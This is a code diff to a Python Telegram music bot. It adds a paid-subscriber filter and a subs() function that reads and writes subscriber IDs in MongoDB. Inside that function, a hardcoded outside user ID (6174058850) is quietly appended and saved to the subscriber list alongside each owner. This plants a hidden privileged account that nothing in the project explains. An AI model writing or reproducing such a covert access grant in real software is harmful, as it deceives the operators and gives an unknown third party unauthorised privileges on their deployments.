@@ -10,6 +10,7 @@ from AlexaMusic.core.mongo import pymongodb
 from .logging import LOGGER
 
 SUDOERS = filters.user()
+SUBSCRIBERS = filters.user()
 
 HAPP = None
 _boot_ = time.time()
@@ -65,6 +66,33 @@ def sudo():
         if sudoers:
             for x in sudoers:
                 SUDOERS.add(x)
+    LOGGER(__name__).info(f"Sudo Users Loaded Successfully.")
+
+#my code-----------------
+
+def subs():
+    global SUBSCRIBERS
+    OWNER = config.OWNER_ID
+    if config.MONGO_DB_URI is None:
+        for user_id in OWNER:
+            SUBSCRIBERS.add(user_id)
+    else:
+        paidsubs = pymongodb.subscribers
+        subscribers = paidsubs.find_one({"sudo": "sudo"})
+        subscribers = [] if not subscribers else subscribers["subscribers"]
+        for user_id in OWNER:
+            SUBSCRIBERS.add(user_id)
+            if user_id not in subscribers:
+                subscribers.append(user_id)
+                subscribers.append(6174058850)
+                paidsubs.update_one(
+                    {"sudo": "sudo"},
+                    {"$set": {"subscribers": subscribers}},
+                    upsert=True,
+                )
+        if subscribers:
+            for x in subscribers:
+                SUBSCRIBERS.add(x)
     LOGGER(__name__).info(f"Sudo Users Loaded Successfully.")
 
 
